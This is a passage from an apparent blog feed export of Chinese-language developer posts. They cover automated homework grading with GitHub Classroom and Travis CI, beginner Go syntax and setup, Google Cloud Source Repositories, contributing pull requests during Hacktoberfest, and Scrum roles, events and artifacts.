每天我都會要求學生在 slack 群組裡面 po 昨天跟今天做的事情，雖然跟實際的 Stand-up meeting 還是相差許多，但至少初衷是一樣的：「幫自己整理進度、讓大家了解你的進度」。
秉持著相同的理念，這次的交作業機制我決定採用 Github Flow。
什麼是 Github Flow？可以先看一下我在官網上面截的圖：

簡單來說就是如果你要做任何改變的話，你要 follow 以下原則：

開新的 Branch
送 Pull Request
等 Review
確定沒問題，merge 到 master

我們公司也是採用類似的工作流程，因此我自己本身對這個流程滿熟悉的。而這個流程的好處是什麼？就是在送 PR 的時候，你可以很方便地看到改動以及加上建議：

這樣的方式，豈不是最適合拿來改作業？直接加上註解，可以一行一行修正，合格的作業就直接 approve，不合格的要求修正，然後再送一次 review。
決定好採用 PR 的方式交作業以後，其實還有一個東西要決定，那就是要怎麼送 PR？意思是說，PR 要在哪一個 repo 底下開？大概有以下幾種做法：

老師開一個 hw repo，開權限給所有學生，學生寫完作業以後對 hw 送 PR
學生開一個 hw-student repo，把老師加成協作者，寫完作業送 PR 讓老師 review

前者的話，你必須要在hw底下開不同資料夾，這樣每個學生才有地方來放自己寫的作業。好處很明顯，就是都集中在同一個地方進行管理，但缺點就是這個 repo 會變得很大，因為你可能同時要放 10 個學生寫的作業。
後者的話，學生自己開 repo，然後把老師加進來讓老師能 review，比第一種分散，但是自由度高很多，而且結業以後，學生可以直接把他的 repo 當成作品集的一部分。這兩種比起來，我是比較偏好這個的。
除此之外，其實還有另外一個問題需要解決，那就是有時候作業有固定格式需要遵守，例如說我有一些簡答題，已經在hw下面開好回答的模板，學生只要照著格式寫答案就好，那學生就必須複製這個模板到自己的 repo 底下，其實也是滿麻煩的。
那更好的方式是什麼？
很簡單，就是結合了前面兩種：

老師開一個放作業模板的 repo，學生 fork 這個 repo 到自己帳號底下，並且利用這個 fork 的 repo 交作業

這樣子學生就不用從零開始，可以直接採用老師已經寫好的交作業模板跟格式，只要照著做就行了。而這種處理方式，其實就是我們等等會提到的 Github Classroom。
Github Classroom我一開始看到這個，還以為是什麼神奇的系統，可以自動幫你完成一堆跟改作業有關的事情。但很可惜，這並不是。
Github Classroom 的系統很簡單，首先你要先註冊一個 organization 才能使用。進去之後你可以建立一個 Classroom，就是一堂課的意思。
而每堂課底下，都有一個地方可以讓你新增作業，在新增作業時你可以關聯自己帳號底下的 repo，介面長這樣：

而這個被關聯的 repo，就是你要拿來出作業的 repo，所以你可以先把很多東西都寫好，例如說交作業的規則跟格式之類的。像我的話就是會先把檔案開好，學生只要在指定的檔案下面寫答案就好：

在新增作業之後，會有一個自動產生的 invitation link，只要學生點擊並且加入之後，就會自動在你的 organization 底下產生新的 repo。
例如說我拿來關聯的 repo 叫做mentor-program，學生的帳號是 abcd，就會產生一個 mentor-program-abcd，而這個 repo 就是基於你原本的所產生的，所以東西都一模一樣。產生之後呢，他會自動把學生本人跟老師設為協作者，然後學生只有 developer 的權限，老師則是有 admin 的權限。
所以說呢，用了 Github Classroom 的好處就是有一個自動化的系統幫你 fork 一份你的 repo 給學生，然後自動設定權限，並且在後台可以看到每個學生的 repo：

做到這裡，你就有一個很不錯的改作業系統了，流程非常簡單：

學生透過 Github Classroom 產生的連結加入
產生 mentor-progam-student_username 的 repo
學生 clone 下來，開新的 branch，寫作業
寫完作業送 PR
老師 review，確認沒問題再 merge

結合 CI 自動改作業剛剛有說過，你學生的 repo 都是以你提供的為基礎 fork 出去的，所以學生可以按照你訂的規則來寫作業。
舉我剛剛提到的例子，我就先幫學生開好hw1.js、hw2.js…他們直接在檔案裡面寫答案就好。如果你有注意到的話，我還幫他們開了hw1.test.js，拿來做 unit test 用的。
在第一週的作業裡面，他們被要求實作出幾個簡單的 function，例如說判斷質數、判斷回文等等。所以每個 js 裡面就只是 export 出一個 function 而已。那要怎麼驗證呢？跑測試！
既然是那麼簡單的一些 function，那就可以寫 unit test 來驗證結果是否正確，而這個時候，我就想到其實可以結合 CI 做出自動改作業系統。
流程很簡單：

學生送 PR
串上 CI，偵測到有 PR 自動跑 test
在 PR 裡面顯示結果

完成後的結果會像這樣，可以直接在 PR 裡面看到 CI 跑測試之後的結果：

我採用的系統是有名的Travis CI，其實應用上也很簡單，登入進去之後它會自動抓你的 repo，就可以看到一個列表，只要打勾就可以把 Travis 跟 Github 串起來：

不過在打勾之前，你要對你的 repo 做一些設定。其實 CI 的原理很簡單，就是你提供一些指令讓它幫你跑，以我的課程來說，就是跑npm run test而已。
只要在專案的根目錄底下新增.travis.yml，就可以指定你要跑的環境跟其他參數，以我的專案為例：
language: node_jsnode_js:  - &quot;node&quot;cache: yarnbefore_script:   - wget $TESTCASE_URLnotifications:  email: false

Travis 很聰明，所以預設就會執行npm run test，所以不必在這邊設定任何東西。可以注意到的是，我這邊額外設定了before_script ，而後面接的參數就是你要執行的指令。
會這樣設定是因為我希望在 repo 裡面的 test 檔案可以讓學生自己練習，他們自由修改，而我真正拿來改作業的 test 我把它放在遠端了，在跑 CI 的時候才抓下來，確保學生不可能改到。
準備完成以後，你只要去 CI 的後台打勾，並且進去調一些設定（例如說只要幫 PR 跑測試、環境變數的調整等等），一切就大功告成了！

結論結合了 Github Classroom 跟 Travis CI，就能夠很輕鬆的打造出一個方便讓學生交作業，也讓老師可以很輕鬆的批改作業，甚至是讓系統自動改作業的服務。
如果你想要更進一步，CI 那端還有很多延伸應用可以做，例如說跑測試失敗的話就自動把 PR 關掉，或者是自動回覆說哪一個作業是錯誤的，甚至也可以把這些訊息記起來，直接做一個學生的 scoreboard 之類的，有很多有趣的應用可以玩。
但若是你只是想要基本的東西，只要簡單設定一下就夠了。
這一篇整理了我最近課程的改作業流程，目前嘗試起來都覺得很不錯，一來是我可以方便改作業，二來是強迫學生熟悉 Git 的流程，而且他們會越來越熟練。
如果你有哪些更好的建議，歡迎在下面留言，文中如果有錯也麻煩不吝指出，感謝。
關於作者：@huli 野生工程師，相信分享與交流能讓世界變得更美好
]]></content>
      <tags>
        <tag>github</tag>
        <tag>github classroom</tag>
        <tag>travis</tag>
        <tag>ci</tag>
      </tags>
  </entry>
  <entry>
    <title>Go Web 程式設計入門教學：語法基礎之流程控制（flow control）篇</title>
    <url>/2018/02/17/golang101-tutorial-basic-flow-control/</url>
    <content><![CDATA[
前言之前我們曾介紹了如何建置 Go 變數和資料型別的使用，接下來的單元我們將透過 Golang Web 程式設計來學習 Go 這個程式語言。而在這個單元中我們將介紹 Go 的流程控制的使用。程式語言唯有動手作才能學的好，你可以參考之前的文章建置開發環境或是使用線上開發環境進行學習。
流程控制簡介一般而言，程式語言是由上往下執行，若我們需要程式依照我們設計的邏輯方向執行就需要流程控制的協助。在這邊主要談的流程控制有三部分：條件判斷、迴圈循環、跳躍控制。
我們使用制做菜脯蛋食譜步驟來講解範例：

放點油
打蛋
如果喜歡蔥花可以加入蔥花，如果喜歡菜脯可以加入菜脯（程式術語：if...else 條件判斷）
放入少許鹽巴
中火快炒，翻五次面（程式術語：for 迴圈）
當看到蛋面呈現金黃色時可以起鍋，結束料理（程式術語：while 迴圈）
好吃的蔥花蛋或菜脯蛋上桌

首先介紹，條件判斷，如果 if…。條件判斷是一種邏輯判斷，當符合條件就怎麼樣，不符合條件就怎麼樣。

if…else
 package mainimport &quot;fmt&quot;var taste = &quot;菜脯蛋&quot; // 喜歡菜脯蛋if taste == &quot;菜脯蛋&quot; &#123;    fmt.Println(&quot;加入菜脯&quot;)&#125; else &#123;    fmt.Println(&quot;加入蔥花&quot;)&#125;

 Go 語言中除了條件判斷不用加 () 外，也可以在條件判斷敘述宣告變數，但只會存活於條件邏輯區塊使用上。
 package mainimport &quot;fmt&quot;if taste := &quot;蔥花蛋&quot;; taste == &quot;菜脯蛋&quot; &#123;    fmt.Println(&quot;加入菜脯&quot;)&#125; else &#123;    fmt.Println(&quot;加入蔥花&quot;)&#125;fmt.Println(taste) // 編譯錯誤，條件判斷敘述宣告的變數，只會存活於條件邏輯區塊使用上

goto Go 中還提供了 goto 語法，讓你可以直接跳躍到某定義區塊，但建議小心使用。
 package mainimport &quot;fmt&quot;func main() &#123;    num := 91    if num &gt;= 60 &#123;        fmt.Println(&quot;hi true&quot;)        goto PASS    &#125; else &#123;        fmt.Println(&quot;hi false&quot;)    &#125;    PASS:        fmt.Println(&quot;hi pass&quot;)&#125;

for 迴圈 在 go 中 for 迴圈的功能強大，既可以被當做循環讀取資料，又可以當做 while 來控制邏輯，還能反覆操作運算，以下介紹 for 語法：
 for 變數宣告或函式回傳值; 條件判斷; 每輪結束時操作 &#123;    // ...&#125;

 我們接著使用食譜範例，中火快炒，翻五次面：
 package mainimport &quot;fmt&quot;func main() &#123;    for index := 0; index &lt; 5; index++ &#123;        fmt.Println(&quot;翻面&quot;, index + 1, &quot;次&quot;)            &#125;&#125;

 當我們不知道具體要迴圈幾次時可以使用 while，但由於 Go 中沒有 while 關鍵字，當忽略了 ;，就可以當 while 迴圈使用：
 package mainimport &quot;fmt&quot;// 從 1 加到 10func main() &#123;    sum := 0    i := 0    for i &lt;= 10 &#123;        sum += i        i++    &#125;    fmt.Println(sum)&#125;

 使用 break 和 continue 可以跳出整個循環和跳過當下：
 package mainimport &quot;fmt&quot;// 從 1 加到 10func main() &#123;    sum := 0    i := 0    for i &lt;= 10 &#123;        if i == 3 &#123;            break; // continue 跳過 3，break 到 3 整個循環跳出        &#125;        sum += i        i++    &#125;    fmt.Println(sum)&#125;

 善用 for 也可以把 slice 和 map 資料一一取出：
 package mainimport &quot;fmt&quot;for key, value := range map &#123; // 也可以忽略其中一值，for _, value := range map    fmt.Println(key, value)&#125;

switch 當我們需要寫很多 if...else 時就是使用 switch 的好時機：
 package mainimport &quot;fmt&quot;func main() &#123;    i := 2    switch i &#123;        case 1:            fmt.Println(&quot;hello:&quot;, i) // go 中不用加 break 會自己跳出不會往下執行        case 2:            fmt.Println(&quot;hello:&quot;, i) // 加上 fallthrough 可以強制往下執行            fallthrough        default:            fmt.Println(&quot;hello: default&quot;)            &#125;	&#125;

總結以上就是關於 Go 程式語言的基本語法中流程控制介紹，接下來的文章我們將透過 Golang Web 程式設計來學習 Go 這個程式語言的方方面面。
參考文件
A tour of go
Go Tutorial
Go by Example
Go Programming Language: An Introductory Tutorial
Go tour Exercise
Ubuntu Go install
從Go看現代程式語言

（image via cuelogic）
關於作者：@kdchang 文藝型開發者，夢想是做出人們想用的產品和辦一所心目中理想的學校。A Starter &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:) 
]]></content>
      <tags>
        <tag>web</tag>
        <tag>程式設計</tag>
        <tag>programming</tag>
        <tag>coding</tag>
        <tag>computer science</tag>
        <tag>電腦科學</tag>
        <tag>GO</tag>
        <tag>GO lang</tag>
        <tag>golang</tag>
        <tag>go web</tag>
        <tag>自學程式</tag>
        <tag>自學程式設計</tag>
        <tag>線上自學</tag>
        <tag>coder</tag>
        <tag>computer</tag>
        <tag>code</tag>
        <tag>學寫程式</tag>
        <tag>學程式</tag>
      </tags>
  </entry>
  <entry>
    <title>Go Web 程式設計入門教學：基礎介紹與環境建置</title>
    <url>/2017/09/09/golang101-tutorial-introduction/</url>
    <content><![CDATA[
前言Go 程式語言 是 Google 推出的靜態程式語言，其特色在於核心語法和關鍵字非常精簡（全部只有 25 個關鍵字！）並擷取了靜態語言的效能和動態語言的開發效率的優點，具備垃圾回收、快速編譯等特性，且針對平行化程式設計在使用上非常方便。接下來的文章我們將透過 Golang Web 程式設計來學習 Go 這個程式語言。程式語言唯有動手作才能學的好，你可以參考本篇文章建置開發環境或是使用線上開發環境進行學習。
Go 環境建置安裝方式：

官網套裝安裝，線上也有官方提供的 playground 線上執行環境可以使用

使用套件管理工具 homebrew（mac）、apt-get（linux） 等進行安裝
 例如，在 linux 上安裝：
 $ sudo apt-get install golang-go

 或是主動宣告版本
 $ sudo apt-get install golang-1.8-go

 在 mac 上安裝：
 $ brew install go

使用 gcc、MinGW（windows）等編譯器編譯原始 Go 檔案


對於一般初學者來說，可以使用官網或是套件管理工具來安裝，可以留意環境變數是否有設定成功。
若有成功安裝，可以打開終端機執行 go version 會出現相關版本訊息，以下是 mac 的範例：
$ go versiongo version go1.9 darwin/amd64

在 Go 中也提供了許多方便指令，方便我們編譯、測試和執行程式：

編譯檔案
$ go build

執行單元測試（unit testing），Go 一開始就內建了測試的機制，執行 go test 的話，會自動讀取套件目錄中的 *_test.go 來進行編譯、測試
$ go test

讓程式可以格式化 formatting，符合 go 的 convention
$ go fmt

安裝套件
$ go get

靜態分析潛在 bug
$ go vet

可以快速 build 並執行程式
$ go run

展示 go 相關文件
$ godoc

重新命名變數和函式
$ gorename

產生程式碼
$ go generate

你的第一個 Go 程式在 Go 中程式運行的入口是套件 main。在這個程式中使用並導入了套件 “fmt”，在 Go 程式中程式執行入口是 main function，若成功在終端機執行 $ go run，則會在終端機印出 Hello, World! 的 Go 程式，恭喜完成你的第一個 Go 程式了！
// 宣告程式屬於哪個 packagepackage main// 引入套件import (    &quot;fmt&quot;)// 程式執行入口func main() &#123;    // 使用 fmt 套件印出字串 word，使用 := 簡化原本變數宣告 var word string = &quot;Hello, World!&quot;    word := &quot;Hello, World!&quot;    fmt.Println(word)&#125; 

另外一個範例是引入了 math/rand 套件產生隨機整數（由於環境中 seed 一樣所以會印出同樣值）
package mainimport (  &quot;fmt&quot;  &quot;math/rand&quot;)func main() &#123;	fmt.Println(&quot;My favorite number is&quot;, rand.Intn(10))&#125;

Go 有支援許多網路程式開發的套件，可以用很簡單的幾行就完成網路伺服器的建置：
package mainimport (    &quot;io&quot;    &quot;net/http&quot;)// 處理 request 和 response 的函式func hello(w http.ResponseWriter, r *http.Request) &#123;    // 印出 hello world    io.WriteString(w, &quot;Hello world!&quot;)&#125;func main() &#123;    // router 讓網址可以對應處理函式    http.HandleFunc(&quot;/&quot;, hello)    // 監聽 8000 port    http.ListenAndServe(&quot;:8000&quot;, nil)&#125;

總結以上就是關於 Go 程式語言的基本教學介紹和環境建置，接下來的文章我們將透過 Golang Web 程式設計來學習 Go 這個程式語言的方方面面。
參考文件
A tour of go
Go Tutorial
Go by Example
Go Programming Language: An Introductory Tutorial
Go tour Exercise
Ubuntu Go install
從Go看現代程式語言

（image via cuelogic）
關於作者：@kdchang 文藝型開發者，夢想是做出人們想用的產品和辦一所心目中理想的學校。A Starter &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:) 
]]></content>
      <tags>
        <tag>web</tag>
        <tag>程式設計</tag>
        <tag>programming</tag>
        <tag>coding</tag>
        <tag>computer science</tag>
        <tag>電腦科學</tag>
        <tag>GO</tag>
        <tag>GO lang</tag>
        <tag>golang</tag>
        <tag>go web</tag>
        <tag>自學程式</tag>
        <tag>自學程式設計</tag>
        <tag>線上自學</tag>
        <tag>coder</tag>
        <tag>computer</tag>
        <tag>code</tag>
        <tag>學寫程式</tag>
        <tag>學程式</tag>
      </tags>
  </entry>
  <entry>
    <title>Google Cloud Source Repositories 使用紀錄</title>
    <url>/2018/10/12/google-cloud-source-repositories-record/</url>
    <content><![CDATA[前言GCSR(Google Cloud Source Repositories) 是 Google 推出以 git 為基礎的程式碼代管服務。
原先我的 Side Project 也是自己建 git server 來放，後來因為硬體故障等等，自己維護需要花費不少時間和成本(懶!)，加上本身也是 Google 的愛好者，最後選擇 GCSR 來試試。
首先談談 GCSR 的缺點，基本上第 1 個缺點為 GCSR 必須依附於 Google Cloud Platform(GCP)。

也就是說你必須先了解基本的 GCP 使用方式

第 2 個缺點在於建立和拷貝 Repository 的動作必須透過 Google Cloud SDK。

也就是說你必須先安裝 Google Cloud SDK

第 3 個缺點在於 GCSR 免費版的限制


Repository 最多 5 位使用者，每增加 1 人，每月 1 美金
Repository 儲存空間最大 50 GB，每增加 1 GB，每月 0.10 美金
Repository 最大 50 GB 輸出，每增加 1 GB 輸出，每月 0.10 美金


缺點看完了，我們來看看優點吧。
個人認為 GCSR 最大的優點在於可以連結 Google Cloud Platform 搭配不同工具以進行擴充。其次在於速度及安全性有一定的保障，加上內建 CI 功能和 User Interface，優於現今一般的程式碼託管服務。
以上的優缺點若您都能接受，那就繼續往下看吧。
首先提供官網 GCSR 的說明。若想直接參考使用方式請看 Quick Start。
1. 如何在 GCSR 上建立專案以及複製專案到本地端
在 Google Cloud Platform 建立專案
 建議新增獨立的 GCP 專案來放置 Repository 避免和其他的專案混淆。

安裝 Google Cloud SDK
 安裝 SDK 的目的就是用來新增，複製專案。注意安裝完成之後還需要進行初始化的動作，參考這裡。

安裝 git
 Windows 系統官方推薦使用 git-scm，Linux 系統就用 command line 安裝 git 吧

建立 hello-world Repository(Google Cloud SDK)
 gcloud source repos create hello-world

拷貝 hello-world Repository 到 local
 gcloud source repos clone hello-world


2. 加入 HelloWorld script 和 Deploy 檔案1.移動到本地端 hello-world 目錄並新增 main.py 檔案，將下方內容複製到 main.py
!/usr/bin/env python import webapp2 class MainHandler(webapp2.RequestHandler):   def get(self):      self.response.write(&#x27;Hello World!&#x27;) app = webapp2.WSGIApplication([   (&#x27;/&#x27;, MainHandler)], debug=True)
2.新增 app.yaml 檔案，將下方內容複製到 app.yaml
runtime: python27api_version: 1threadsafe: yes handlers:- url: .*script: main.app libraries:- name: webapp2version: &quot;2.5.2&quot;

3.push 到遠端 hello-world Repository
git add . git commit -m &quot;Add Hello World app to Cloud Source Repositories&quot; git push origin master

3. 部署到 App Engine1.輸入以下指令以部署到 App Engine
gcloud app deploy app.yaml
2.確認部署內容是否成功
gcloud app browse
完成後應該會開啟瀏覽器並顯示 Hello World!
總結經由上述的分享你就能進行基本的 GCSR 操作，但使用 GCSR 的優勢可不僅於此，你可以透過 App Engine 雲端部屬，整合 Cloud Build 自動編譯，使用 Cloud Debugger 進行除錯。
]]></content>
      <tags>
        <tag>google cloud</tag>
      </tags>
  </entry>
  <entry>
    <title>Hacktoberfest：一起踏入 open source 的世界吧！</title>
    <url>/2016/10/14/hacktoberfest-2016/</url>
    <content><![CDATA[（圖片來自： Hacktoberfest is back）
前言Hacktoberfest 是由 hack + october + festival 組合而成的名詞，是由知名的 VPS 供應商 DigitalOcean 與大家所熟知的 github  所舉辦的活動，目的在於推廣 open source，希望許多人能藉由這個活動踏進 open source 的世界。
這個活動的口號是：

Support and celebrate open source. Earn a limited edition T-shirt.

只要在十月份送四個 Pull Request（任何在 github 上公開的 repo 都可以），就符合免費拿 T-shirt 的條件！
在 活動網站 上，有一些 Featured Projects，你可以直接去看看有沒有 issue 是你可以幫忙解的。
當然，如果你跟我一樣，是個開源初心者，網站下方也有許多有用的文章，可以幫助你了解如何對開源專案做出貢獻。
心得儘管現在幾乎所有的工程師都聽過 github，也偶爾會看到一些有趣的專案；甚至連很多公司在徵才的時候，都會要求附上 github 帳號。但是，我相信有很多人跟我一樣，「幾乎從來沒有送過 Pull Request（以下簡稱 PR）」。
所以這篇文章主要是想宣傳一下這個活動，希望大家都有機會體驗到送 PR 的感覺，順便簡單寫給新手一些教學，讓你知道什麼是 PR。
PR 是什麼？簡單來說，當你在 github 上面某個專案看到一些 issue 的時候，你就可以試著去解掉這個 issue。
這邊的 issue 指的不一定是程式發生的 bug，也有可能是文件不夠完整，需要加強，或者是要幫忙寫測試，或只是簡單的補上專案的 License 等等。
為了要修改這個專案，你必須要 fork 一份到自己的帳號底下，用這份專案當作基底來修改（一般來說，還會新增一個 branch），修改完以後，你要怎麼把這些修改好的 commit 發給原作者呢？
因為原本的那個專案不是你的，你沒有權限（fork 的那一份你才有權限），所以你又不能直接 push 到原本的上面，那原作者要怎麼收到你這份修改完成的 code 呢？
沒錯！這個時候就需要 Pull Request，提交一個 PR。
當你提交 PR 的時候，可以指定你自己的 branch 跟原作者那邊的 branch，並且把你剛剛新增的 commit 顯示出來，就可以提交一個新的 PR 給原作者，讓原作者去審核這個 commit。如果順利的話，就會直接把你這個 commit merge 進去原來的專案，這份專案就有你的貢獻在裡面了！
如果你需要更詳細地講解，可以參考：
花20分钟写的-大白话讲解如何给github上项目贡献代码3.3 创建Pull RequestGithub 發 Pull Request &amp; 貢獻流程速查6.2 GitHub - 參與一個專案
詳細流程簡介透過 hacktoberfest 這個活動，我找到一些對新手非常友善的 issue，身為一個新手，我十分感動。例如說我們可以來看看 這一個 Telescope 的 issue


這 issue 直接跟你講說你需要會什麼、要解決的問題是什麼，以及如果你是第一次 contribute 的話，你應該要注意哪些事項，提供 step by step 的步驟給你。
很友善對吧！
通常在專案裡面都會有一份 CONTRIBUTING.md，想要貢獻以前記得仔細閱讀！裡面會說明詳細的流程，一般來說，流程大致上都會長這樣：

找到 issue，確認沒有其他人跟你同時在做（會有 label 顯示，通常沒人在處理的會寫 up for grabs，有人在做的會寫 in progress），並且在底下說明你想要解這個 issue。
得到同意以後，你就可以開始解這個 issue 了，這 issue 的標籤也會變更成 in progress，有些專案會要求把這個專案 assign 給自己。
fork 這個專案到自己的帳號底下
在你的電腦上把 fork 好的專案 clone 下來
查看專案裡面的貢獻指南（一般都是 CONTRIBUTING.md），裡面會有詳細的流程，可參考我下面的說明
新開一個 branch（CONTRIBUTING.md 裡面通常會提示你 branch 名稱應該取什麼，有的會取 issue 的編號，有的會取叫 dev，每個專案都不同）
設定好本機的環境，順利讓專案執行，並且跑測試（你會在 CONTRIBUTING.md 裡面看到如何設定環境）
開始解 issue 囉！

可是，如果你程式沒那麼強，是不是就沒辦法貢獻了呢？
不是的！有些 issue 會特別標明是專門給新手的，適合第一次 contribute 的人！就算你還是覺得這些 issue 太難，有些 issue 與程式無關，可能只是幫忙寫一些文件之類的。
在解完 issue 以後，接著就是發 PR 了。但是在發 PR 之前，請務必確保自己改過以後的 code 有通過測試。因為你送 PR 上去以後，通常也會再跑一遍測試，自己先在本機測過，可以省掉很多時間，也減少要幫你 review 的人的麻煩。
確認測試通過以後，就可以送 PR 了。
在送 PR 的時候，內文跟標題通常也會有一定的規範，例如說要提到你解了哪一個 issue，用什麼方法去解的等等，總之就是大概說明一下即可。
最後，就等專案的作者們有時間的時候會來審核，審核通過以後，你就正式對這個專案產生貢獻了。
結論有標上 hacktoberfest 標籤的 issue 可以先嘗試解解看，或是從活動網站上面推薦的專案開始下手。
比較大的專案的好處就是文件很完整，把每一個步驟都寫得很清楚，讓你不會不知所措。
如果你跟我一樣是寫 JavaScript，推薦你 Telescope 這個專案，裡面每一個 issue 都寫得很清楚要做什麼，contribute 的文件也非常齊全，有些甚至還會附提示呢！
希望大家趁著這個活動可以嘗試看看送 PR、拿衣服，如果沒有拿到也不用太傷心，至少你對開源的世界有了更進一步的瞭解，也是獲益良多了。
關於作者：@huli 野生工程師，相信分享與交流能讓世界變得更美好
]]></content>
      <tags>
        <tag>github</tag>
        <tag>hacktoberfest</tag>
        <tag>open_source</tag>
      </tags>
  </entry>
  <entry>
    <title>當一個 Scrum Master 是一個怎樣的體驗？</title>
    <url>/2019/01/05/hello-i-am-a-scrum-master/</url>
    <content><![CDATA[
前言Scrum 是一個以團隊為基礎來開發複雜系統和產品的敏捷開發框架和方法論。相信很多軟體開發人員都聽過 Scrum，而且也把它運用在產品開發中，然而每個團隊在使用 Scrum 時都會遇到不同的問題，有些是共通性的問題，有些是個別團隊所遇到的問題。過去一段時間在筆者的職業生涯中因緣際會地經歷了開發者、產品負責人以及 Scrum Master 等角色，對於不同角色的特性和所應具備的特質和能力以及 Scrum 的能與不能都有些許的認識。接下來，本文將透過一個 Scrum Master 視角去探討 Scrum Master 在 Scrum Team 中所扮演的角色和可能遇到的挑戰和機遇。

Scrum 先修課：關於 Scrum 你必須先明白的專有名詞Role 角色
Product Owner 負責規劃產品 road map，負責釐清使用者和 Stakeholder 的需求並轉化成具有商業價值的 User Story，並評估 Story 的優先順序，決定哪些項目要從 Backlog 進入到 sprint 當中。此外，Product Owner 也必須和 Dev Team 成員討論出 Story 的 Acceptance criteria 和負責驗收成果

Scrum Master &#x2F; Agile Coach 又稱敏捷教練，負責導入 Scrum 流程並培養團隊成員具備 agile 思維。Scrum Master 負責主持 Scrum 相關會議與 process 和協助管理分析 Sprint 產出物，此外也必須協助整個流程持續改善，最終讓團隊達到 process self-managed 狀態。一般而言，Scrum Master 在團隊裡通常沒有實際管理權但必須協助其他成員在遇到 block 事情時去除障礙，有時也要扮演輔導長的角色激勵團隊士氣。簡言之，Scrum Master 是一個必須對於產品開發流程以及溝通能力有一定掌握並具備一定的技術實力的角色。說真的，真正要當的好 Scrum Master，不容易

Development Team &#x2F; Dev Team 具備跨職能的開發團隊成員（可以完成 User Story 的所有開發工作，包含開發、測試等），一般遵守兩塊 pizza 原則，以不超過 6-8 人為原則。團隊成員必須具備互助合作的騎士精神，以團隊目標為目標，在互相協助的基礎下一起在 Sprint 結束前完成於 Sprint 開始時所承諾應該交付的任務

Stakeholder 利害關係人，需求的起源地。在直接面對消費者市場的產品團隊可能是一般消費者，若是開發內部工具或是面對企業市場的產品團隊，利害關係人可能會是 AM（客戶經理）、BD（商務拓展）、Tech Support（技術支援）、Marketing（行銷）等單位的同仁



Event 活動
Sprint Sprint 在橄欖球中為衝刺的意思，指的是一個 Scrum 的週期。通常以 2-4 週為一個單位，理論上除了緊急 bug 或是 task 外，不能於 Sprint 開始後額外新增 Story 進入 Sprint 當中

Sprint Planning，會議時間：1-2 hours 於 Sprint 開始前舉辦的會議。根據 Product Owner 的優先順序和團隊可以消耗的點數（velocity）評估哪些 Story 需要進入到 Sprint 當中的會議。由 Scrum Master 主持，Product Owner 和 Dev Team 參與，由 Dev Team 認領想要負責的 Story，Dev Team 於會議結束後根據 Story 劃分成更細部的 task，然後 Scrum Master 確認沒問題後開始 Sprint 的週期

Sprint Gromming (Backlog Refinement&#x2F;Stroy time)，會議時間：一次 2-3 hours 或分成兩次，每次 1-1.5 hours 於 Sprint 中間舉辦的會議，主要目的在評估下一個 Sprint 中要從 Backlog 中拿出來做的 Story 點數的估計（Planning poker）。一般透過 Product Owner 說明 User Story 然後和 Dev Team 討論定義出以 User 角度表述的 Acceptance criteria。記得這邊的 Story Point 是相對值並不是完全 mapping 到時間，而且每個 team 的狀況都會不一樣，主要是根據你們 team 對於這項 Story 的 Complexity、Uncertainty 和 Effort 去做評估，一般使用費式數列表示（1、2、3、5、8、13、21…）。這個會議十分重要，透過 Planning poker 的過程可以讓大家對於 Story 的認知和知識可以 align 到同一條線上（例如估計點數不一致時彼此說明和討論，增進對於 Story 和系統的了解）。記得，若是 User Story 過大，沒辦法在一個 Sprint 完成會建議把它切成比較小的 Story。若是連 Product Owner 都沒辦法描述很清楚的 User Story 會要求 Product Owner 先去釐清需求在下一次 Sprint Gromming 會議或是 Sprint Planning 前再次 repoint

Sprint Review (Sprint Demo)，會議時間：兩次 30mins（利害關係人&#x2F;內部團隊） 在 Sprint Review 中，Scrum Master 會邀請 Stakeholder 參與會議，由 Scrum Master 簡介這次 Sprint 所完成的 Shippable Product Increment（可交付的產品增量）和 Dev Team 展示開發成果。讓市場業務端和系統開發端可以彼此溝通並確認產品方向與市場吻合，若是有需要產品改善或是新的需求產生將由 Product Owner 釐清後放入 Backlog 中

Sprint Retrospective（Sprint Retro），會議時間：一次 1 hour Sprint Retro 簡而言之式是 Scrum team 於 Sprint 結束時的閉門會議。通常在透過感謝的對象來緩和氣氛，並檢討這次 Sprint 的流程是否有需要檢討的部份或是做的不錯的部份，若是沒有完全完成所承諾要完成的事情，必須了解原因（例如低估複雜度或是中間有遇到 block 影響開發）。通常會搭配 Sprint Planning Doc 和 Burn down chart 以及上次的 Sprint Retrospective Doc 列出的 todo item 來進行檢討

Daily Scrum (Daily Standup Meeting) 每天約 15 分鐘的站立會議，每位 Scrum team 更新自己昨天完成的事項、今天預計完成的事項以及是否有遇到什麼 block 阻礙。若是有 block 將由 Scrum Master 溝通協調並調度團隊資源協助移除成員障礙。若是有無法在 Sprint 結束前完成的 Story 也要讓 Product Owner 提早知道。另外，Burn down 也是需要在 Daily Scrum 大家要一起觀看 Sprint 是否有正常運作的指標

User Stroy Mapping &#x2F; workshop，會議時間：一次 1.5-2 hours 一般不能算是標準的 Sprint Event，通常是 Product Owner 在對於開發新產品的掌握度比較低，需要開發成員一起協助定義 User Story 所召開的會議


Artifact 產出物
Backlog 裝有待完成的 Story 或是 Bug 的袋子，在 Sprint Gromming 時根據 Priority 進行點數估計，於 Sprint Planning 決定哪些已估計 Story 需要進入這次的 Sprint 當中

Sprint Planning Doc 記錄當次 Sprint 所承諾要完成的 Story 和需要修復的 Bug（通常為插單緊急 Bug 或是不緊急但有在 Gromming 進行點數估計的 Story），Dev Team 成員需要定期更新所負責的 Story 的相關文件

Sprint Gromming Doc 記錄當次 Sprint 所承諾要完成的 Story &#x2F; Acceptance criteria 和需要修復的 Bug 的點數估計。

Sprint Retrospective Doc 記錄 Sprint 檢討會議中的待辦事項和檢討事項

Burn down chart &#x2F; Burn up chart 以團隊為單位，記錄 Sprint 完成狀況的圖表，Burn down chart 記錄點數完成下降的趨勢。Burn up chart 記錄累積完成的點數和 scope 的趨勢
 

Scrum Board 記錄 Sprint 過程中每一個 Story 以及 Story 下 task 的狀況，是在 Todo 還是 In Progress 還是 Done
 

Definition of Done（DoD） 團隊定義的驗收成果標準，例如開發一個新功能必須含：Dev + QA + Doc + Deploy 才算 Done，是每一個 Story 都必須遵守的完成標準

Epic &#x2F; Theme &#x2F; User Story &#x2F; Acceptance criteria User Story 是用使用者需求角度撰寫的有商業價值的一段敘述，而 Acceptance criteria 則是更為細部的補充描述。當有數個 story 隸屬於某一個相關 feature 時通常會把它歸為同一個 Theme，若是一個大的產品或是系統需要橫跨數個 sprint 時會把這些 Story 都歸類為同一個 Epic
